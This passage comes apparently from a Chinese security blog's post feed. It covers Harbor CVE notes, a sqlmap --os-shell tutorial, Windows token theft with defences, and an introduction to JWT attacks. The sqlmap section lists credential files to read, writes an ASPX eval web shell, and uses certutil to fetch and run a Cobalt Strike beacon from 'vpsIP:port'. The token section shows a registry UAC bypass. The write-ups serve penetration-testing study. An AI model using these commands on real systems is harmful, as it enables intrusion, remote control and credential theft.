<h2 id="CVE-2020-13788"><a href="#CVE-2020-13788" class="headerlink" title="CVE-2020-13788"></a>CVE-2020-13788</h2><p>漏洞版本： 1.8.*、1.9.*、&lt;2.0.1</p>
<blockquote>
<p>一个有限的服务器端请求伪造 (SSRF)，它允许 Harbor 项目所有者扫描 Harbor 服务器内部网络上主机的 TCP 端口。</p>
</blockquote>
<p><code>src/common/utils/registry/repository.go</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182225933.png" alt="image-20221026154810093"></p>
<p>codeql 可以跑出来</p>
<p>当创建项目后，添加 webhook 需要指定<code>Endpoint URL</code>导致的有限 SSRF</p>
<h2 id="CVE-2020-29662"><a href="#CVE-2020-29662" class="headerlink" title="CVE-2020-29662"></a>CVE-2020-29662</h2><p>漏洞版本： 2.0.0&gt; x &lt;2.0.5、&lt;2.1.2</p>
<blockquote>
<p>  api 权限绕过，<code>/v2/_catalog</code> 本意需要管理员权限，但正则写的有问题导致可以使用 <code>/v2/_catalog/ </code>绕过</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226578.png" alt="image-20221026155946894"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226471.png" alt="image-20221026160127001"></p>
<p>修复<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302182226728.png" alt="image-20221026160301763"></p>
<h2 id="CVE-2022-xxx"><a href="#CVE-2022-xxx" class="headerlink" title="CVE-2022-xxx"></a>CVE-2022-xxx</h2><p>CVE-2022-31667 <code>机器人权限可以被无权访问的用户关闭</code> <code>PUT /robots/&#123;robot_id&#125;</code></p>
<p>CVE-2022-31669  <code>更新标签不变性策略时，没有验证用户权限</code>  <code>PUT /projects/&#123;project_name_or_id&#125;/immutabletagrules/&#123;immutable_rule_id&#125;</code></p>
<p>CVE-2022-31670 <code>更新标签保留策略时，没有验证用户权限</code>  <code>PUT /retentions/&#123;id&#125;</code></p>
<p>CVE-2022-31666  <code> 查看/更新/删除 Webhook时，没有验证用户权限</code>   <code>GET/PUT/DELETE /projects/&#123;project_name_or_id&#125;/webhook/policies/&#123;webhook_policy_id&#125;</code> </p>
<p>CVE-2022-31671  <code>更新/查看P2P preheat execution 日志没有验证用户权限</code> <code>GET /projects/&#123;project_name&#125;/preheat/policies/&#123;preheat_policy_name&#125;/executions/&#123;execution_id&#125;/tasks/&#123;task_id&#125;/logs</code></p>
<p><code>PUT /projects/&#123;project_name&#125;/preheat/policies/&#123;preheat_policy_name&#125;</code></p>
<p>这。。。。。。</p>
]]></content>
      <categories>
        <category>漏洞分析 - CNCF</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>CNCF</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap关于os-shell小记</title>
    <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
<li><p>拥有dba权限</p>
</li>
<li><p>网站的绝对路径</p>
</li>
<li><p>高版本的mysql需要 <code>show variables like &#39;%secure_file_priv%&#39;</code> 或者<code>select </code></p>
<p> <code>@@secure;</code>或者<code>show global variables like &#39;%secure%&#39;;</code>的结果符合要求，secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。这个参数只能通过修改配置文件后重启mysql修改</p>
<ul>
<li>如果该变量为空，则变量无效，这时候最容易利用</li>
<li>如果变量为目录的绝对路径，则服务器会将导入和导出操作限制为仅适用于该目录中的文件</li>
<li>如果设置为NULL，则服务器禁用导入和导出操作。</li>
</ul>
</li>
<li><p>当为php时，magic_quotes_gpc为off，php主动转义的功能关闭**</p>
</li>
</ol>
<p>当执行 –os-shell时，这个时候sqlmap主要做了三件事情：</p>
<ol>
<li>进行目标的一个基础信息的探测。</li>
<li>上传shell到目标web网站上（sqlmap会自动生成两个文件，一个用于命令执行，一个用于上传文件）</li>
<li>退出时删除shell。</li>
</ol>
<h3 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><ol>
<li><p>通过网站报错信息查看绝对路径</p>
</li>
<li><p>通过搜索引擎获取</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">google语法：site:baidu.com warning</span><br><span class="line">site:baidu.com  &quot;fatal error&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置文件获取路径<br> 如果注入点有文件读取权限，就可以通过load_file函数读取配置文件，再从中寻找路径信息。</p>
</li>
</ol>
<p>  Sqlmap 下可以使用–sql-shell 获取一个sql命令执行窗口，使用load_file(‘文件名’)读取文件</p>
<p>  也可以使用 –file-read&#x3D;文件名 ，读取文件</p>
<p>sqlmap -u ‘url’ –batch –file-read&#x3D;&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</p>
<ul>
<li><p><strong>win 下常见的敏感文件</strong></p>
<p><a href="https://link.zhihu.com/?target=https://blog.csdn.net/hardhard123/article/details/80062733">常用的绝对路径收集</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:/boot.ini //查看系统版本 </span><br><span class="line">c:/windows/php.ini //php配置信息 </span><br><span class="line">c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 </span><br><span class="line">c:/winnt/php.ini </span><br><span class="line">c:/winnt/my.ini </span><br><span class="line">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 </span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 </span><br><span class="line">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 </span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe </span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 </span><br><span class="line">//存储了pcAnywhere的登陆密码 </span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件 </span><br><span class="line">c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. </span><br><span class="line">c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 </span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf </span><br><span class="line">C:\Program Files\mysql\my.ini </span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line">c:\windows\php.ini      php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml    IIS虚拟主机配置文件</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Linux 下常见的敏感文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 </span><br><span class="line">/usr/local/apache2/conf/httpd.conf </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置 </span><br><span class="line">/etc/sysconfig/iptables //从中得到防火墙规则策略 </span><br><span class="line">/etc/httpd/conf/httpd.conf // apache配置文件 </span><br><span class="line">/etc/rsyncd.conf //同步程序配置文件 </span><br><span class="line">/etc/my.cnf //mysql的配置文件 </span><br><span class="line">/etc/redhat-release //系统版本 </span><br><span class="line">/etc/issue </span><br><span class="line">/etc/issue.net </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件 </span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 </span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略 </span><br><span class="line">load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 </span><br><span class="line">replace(load_file(0×2F6574632F706173737764),0×3c,0×20) </span><br><span class="line">replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br><span class="line">etc/php.ini          php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf        Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf  虚拟目录配置文件</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通过执行</strong><code>select @@datadir;</code> 获取数据库数据保存的位置、 <code>select @@basedir;</code> 安装位置、<code>select @@plugin_dir</code> mysql plugin目录</p>
<p>可能会有一些关键信息，然后对关键信息搜索，查找默认路径</p>
</li>
</ul>
<p>	</p>
<h3 id="执行–os-shell"><a href="#执行–os-shell" class="headerlink" title="执行–os-shell"></a>执行–os-shell</h3><p>成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106105940.png"></p>
<h2 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h2><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul>
<li>数据库支持外连</li>
<li>数据库权限为SA权限</li>
</ul>
<p>Sqlserver –os-shell主要是利用<code>xp_cmdshell</code>扩展进行命令执行。</p>
<p>当执行–os-shell 时，这个时候sqlmap主要做了三件事情：</p>
<ol>
<li>识别当前数据库类型，然后打印出来。</li>
<li>检测是否为数据库dba，也就是查看是否为sa权限。</li>
<li>检测是否开启了xp_cmdshell，如果没有开启sqlmap就会尝试开启。</li>
</ol>
<h3 id="寻找绝对路径-1"><a href="#寻找绝对路径-1" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><p>可以上传一个复杂文件名的文件，比如：l12asd3123_0sads7_08.jpg</p>
<p>或者在网站中找到一个复杂的文件名，觉得会是唯一的，通过命令查找</p>
<p>sqlmap  –os-shell 下使用，以下任意一条命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r e:\ %i in (1*.php) do @echo %i  *必加</span><br><span class="line">dir c:\ d:\  /s /b | find &quot;icon_assignment.gif&quot;</span><br></pre></td></tr></table></figure>

<p>查找文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110036.png"></p>
<h3 id="上一句话马或者连cs"><a href="#上一句话马或者连cs" class="headerlink" title="上一句话马或者连cs"></a>上一句话马或者连cs</h3><h4 id="写一句话木马"><a href="#写一句话木马" class="headerlink" title="写一句话木马"></a>写一句话木马</h4><p><code> echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;weshe11b&quot;],&quot;unsafe&quot;);%^&gt; &gt; d:\wwwroot\1azq.aspx</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110059.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110119.png"></p>
<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>使用 <code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe a32.exe</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110147.png"></p>
<p>a32.exe 执行， 有时执行不成功饭是因为权限不够，可以下载到有执行权限的目录（假如c:&#x2F;temp&#x2F; ，有权限，<code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe c:/temp/a32.exe </code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110212.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在有拥有dba权限后，</p>
<ul>
<li>mysql拿shell的难点在于寻找绝对路径</li>
<li>sqlserver在于xp_cmdshell 是否开启。</li>
</ul>
]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>sqlmap使用</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title>令牌窃取分析及防范</title>
    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
    <content><![CDATA[<blockquote>
<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
</blockquote>
<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
<ul>
<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
</ul>
<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
<p>目前访问令牌分为两种令牌：</p>
<ul>
<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
</ul>
<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
<ul>
<li>用户帐户的安全标识符(SID)</li>
<li>用户帐户所属的用户群的SIDs</li>
<li>一个logon SID，标识当前登录会话</li>
<li>用户或用户群的特权清单</li>
<li>所有者的SID</li>
<li>基本群的SID</li>
<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
<li>访问令牌资源</li>
<li>是否为primary或impersonation token</li>
<li>限制性SIDs的可选列表</li>
<li>当前impersonation级别</li>
<li>其他统计</li>
</ul>
<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
<blockquote>
<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
</blockquote>
<p>得到授权令牌：		</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>

<p>得到模拟令牌：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>

<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
<ul>
<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
<li>及时安装微软推送的补丁</li>
<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
<li>对于令牌，应采取加密存储及多长验证保护</li>
<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
</ul>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows提权</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>初探JWT</title>
    <url>/2021/03/05/%E5%88%9D%E6%8E%A2JWT/</url>
    <content><![CDATA[<blockquote>
<p>  当你迷茫时，就去学习新东西</p>
</blockquote>
<h1 id="初探JWT"><a href="#初探JWT" class="headerlink" title="初探JWT"></a>初探JWT</h1><h2 id="0x01-什么是JWT"><a href="#0x01-什么是JWT" class="headerlink" title="0x01 什么是JWT"></a>0x01 什么是JWT</h2><p><strong>JWT</strong> 全称为 <strong>JSON Web Tokens</strong> ，是为了在网络应用环境间传递声明而执行的一种基于JSON 的开放标准 (RFC 7519)，该 token 被设计为紧凑且安全的，它的两大使用场景是：认证和数据交换，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<h2 id="0x02-JWT组成"><a href="#0x02-JWT组成" class="headerlink" title="0x02 JWT组成"></a>0x02 JWT组成</h2><p>一个JWT实际上就是一个字符串，它由三部分组成，<strong>头部</strong>、<strong>载荷</strong>与<strong>签名</strong>，中间用 <code>.</code> 分隔，例如：<code>xxxxx.yyyyy.zzzzz</code></p>
<h4 id="2-1-头部-header"><a href="#2-1-头部-header" class="headerlink" title="2.1 头部(header)"></a>2.1 头部(header)</h4><p>头部通常由两部分组成：令牌的类型（即 JWT）和正在使用的签名算法（如 HMAC SHA256 或 RSA.）。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后用 <code>Base64url</code> 编码得到头部，即 <code>xxxxx</code>。</p>
<blockquote>
<p>  <strong>Base64URL算法</strong></p>
<p>  该算法和常见Base64算法类似，稍有差别。Base64中用的三个字符是”+”，”&#x2F;“和”&#x3D;”，由于在URL中有特殊含义，因此Base64URL中对他们做了替换：”&#x3D;”去掉，”+”用”-“替换，”&#x2F;“用”_”替换，这就是Base64URL算法。</p>
</blockquote>
<h4 id="2-2-载荷-Payload"><a href="#2-2-载荷-Payload" class="headerlink" title="2.2 载荷(Payload)"></a>2.2 载荷(Payload)</h4><p>载荷中放置了 <code>token</code> 的一些基本信息，以帮助接收它的服务器来理解这个 <code>token</code>。同时还可以包含一些自定义的信息。</p>
<p>JWT 官方规定了7个，也就是预定义（Registered claims）的载荷，供选用。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://localhost:8000/auth/login&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1451888119</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1454516119</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1451888119</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;37c107e4609ddbcc9c096ea5ee76c667&quot;</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dev&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>  sub (subject)：主题</p>
<p>  iss (issuer)：签发人</p>
<p>  iat (Issued At)：签发时间</p>
<p>  exp (expiration time)：过期时间</p>
<p>  nbf (Not Before)：生效时间</p>
<p>  jti (JWT ID)：编号</p>
<p>  aud (audience)：受众</p>
</blockquote>
<p>除了以上字段之外，你完全可以添加自己想要的任何字段，这里还是提醒一下，由于JWT的标准，信息是不加密的，所以一些敏感信息最好不要添加到json里面</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Age&quot;</span><span class="punctuation">:</span><span class="number">18</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>将上面的 <code>json</code> 进行 <code>Base64url</code> 编码得到载荷，即 <code>yyyyy</code>。</p>
<h4 id="2-3-签名-Signature"><a href="#2-3-签名-Signature" class="headerlink" title="2.3 签名(Signature)"></a>2.3 签名(Signature)</h4><p>签名时需要用到编码过的header、编码过的payload、一个秘钥（这个秘钥只有服务端知道），签名算法是header中指定的那个，如果以 <code>HMACSHA256</code> 加密，就如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>

<p>加密后再进行 <code>Base64url</code> 编码最后得到的字符串就是 <code>token</code> 的第三部分 <code>zzzzz</code>。</p>
<p>组合便可以得到 <code>token：xxxxx.yyyyy.zzzzz</code>。</p>
<p>签名的作用：保证 JWT 没有被篡改过，原理如下：</p>
<blockquote>
<p>  HMAC 算法是不可逆算法，类似 MD5 和 hash ，但多一个密钥，密钥（即上面的 secret）由服务端持有，客户端把 token 发给服务端后，服务端可以把其中的头部和载荷再加上事先的 secret 再进行一次 HMAC 加密，得到的结果和 token 的第三段进行对比，如果一样则表明数据没有被篡改。</p>
<p>  注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</p>
</blockquote>
<p>看一张图就明白了：<a href="https://jwt.io/">https://jwt.io/</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305142735.png" alt="image-20210305142629387"></p>
<h2 id="0x03-渗透测试中的JWT"><a href="#0x03-渗透测试中的JWT" class="headerlink" title="0x03 渗透测试中的JWT"></a>0x03 渗透测试中的JWT</h2><h4 id="3-1-敏感信息泄露"><a href="#3-1-敏感信息泄露" class="headerlink" title="3.1 敏感信息泄露"></a>3.1 敏感信息泄露</h4><p>显然，由于有效载荷是以明文(<code>Base64url</code>只是一种编码方式)形式传输的，因此，如果有效载荷中存在敏感信息的话，就会发生信息泄露。</p>
<h4 id="3-2-将签名算法改为none"><a href="#3-2-将签名算法改为none" class="headerlink" title="3.2 将签名算法改为none"></a>3.2 将签名算法改为none</h4><p>签名算法可以确保JWT在传输过程中不会被恶意用户所篡改，但头部中的<code>alg</code>字段却可以改为<code>none</code>。</p>
<p>另外，一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。</p>
<p>将alg字段改为none后，系统就会从JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。</p>
<p>靶场：<a href="https://github.com/Sjord/jwtdemo/">https://github.com/Sjord/jwtdemo/</a></p>
<p>以 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a> 靶场作为实验</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305170239.png" alt="image-20210305164337558"></p>
